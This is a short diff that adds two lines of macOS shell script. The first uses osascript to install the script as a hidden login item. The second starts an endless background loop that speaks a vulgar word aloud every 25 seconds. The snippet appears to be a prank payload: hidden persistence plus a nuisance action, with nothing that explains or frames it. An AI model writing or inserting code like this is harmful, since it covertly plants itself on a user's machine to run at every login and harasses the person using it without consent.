@@ -1,0 +1,2 @@
+osascript -e 'tell application "System Events" to make login item at end with properties {path:path to me, hidden:true}
+while [ 1 == 1 ]; sleep 25; do say dicks; done &
